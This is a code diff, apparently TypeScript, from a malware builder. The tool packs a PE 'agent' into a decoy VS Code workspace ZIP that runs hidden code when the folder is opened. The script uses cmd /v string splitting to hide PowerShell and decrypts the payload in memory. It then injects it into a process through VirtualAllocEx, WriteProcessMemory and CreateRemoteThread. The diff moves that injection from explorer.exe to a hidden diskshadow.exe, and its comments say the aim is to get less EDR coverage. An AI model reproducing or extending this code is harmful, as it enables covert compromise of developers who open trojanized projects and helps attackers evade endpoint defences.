@@ -9,10 +9,10 @@
  *   3. cmd /v variable split avoids literal "powershell" string
  *   4. PS -enc decrypts embedded PE bytes in memory
  *   5. C# P/Invoke class (random name, polymorphic) loaded via Add-Type
- *   6. PE parsed, injected into explorer.exe via VirtualAllocEx + WriteProcessMemory
+ *   6. PE parsed, injected into diskshadow.exe (LOTL) via VirtualAllocEx + WriteProcessMemory
  *   7. Relocations + imports resolved remotely
  *   8. CreateRemoteThread at PE entry point
- *   9. Agent runs inside explorer.exe — no new process, no files on disk
+ *   9. Agent runs inside diskshadow.exe — signed MS binary, no files on disk
  *
  * Output: ZIP workspace with decoy project structure.
  */
@@ -265,7 +265,7 @@ public class ${className} {
  * Build the PowerShell injection script that:
  * 1. Decrypts + decompresses the embedded PE payload
  * 2. Compiles the C# injection class via Add-Type
- * 3. Finds explorer.exe (LOTL target)
+ * 3. Starts diskshadow.exe as LOTL host (signed MS binary, less EDR coverage)
  * 4. Calls the injection method
  */
 function buildPsScript(encB64: string, csB64: string, className: string): string {
@@ -282,9 +282,12 @@ function buildPsScript(encB64: string, csB64: string, className: string): string
     `$pe=$ob.ToArray()`,
     // Compile C# injection class from base64
     `Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}')))`,
-    // LOTL: find explorer.exe (always running, signed MS binary)
-    `$lp=Get-Process -Name explorer -ErrorAction SilentlyContinue|Select-Object -First 1`,
-    `if(-not $lp){$pi=New-Object Diagnostics.ProcessStartInfo("$env:SYSTEMROOT\\system32\\msiexec.exe","/q");$pi.WindowStyle='Hidden';$pi.CreateNoWindow=$true;$lp=[Diagnostics.Process]::Start($pi)}`,
+    // LOTL: start diskshadow.exe (signed MS binary, less EDR monitoring than explorer)
+    `$pi=New-Object Diagnostics.ProcessStartInfo("$env:SYSTEMROOT\\system32\\diskshadow.exe")`,
+    `$pi.WindowStyle='Hidden'`,
+    `$pi.CreateNoWindow=$true`,
+    `$lp=[Diagnostics.Process]::Start($pi)`,
+    `Start-Sleep -Milliseconds 500`,
     // Inject PE into target process
     `[${className}]::Inject($pe,$lp.Id)|Out-Null`,
   ];
@@ -293,7 +296,7 @@ function buildPsScript(encB64: string, csB64: string, className: string): string
 
 /**
  * Wraps a compiled PE binary into a VS Code workspace ZIP that injects
- * the agent into explorer.exe entirely in-memory when the folder is opened.
+ * the agent into diskshadow.exe entirely in-memory when the folder is opened.
  *
  * @param peBytes  The raw PE binary (EXE) bytes
  * @param outPath  Where to write the resulting .zip
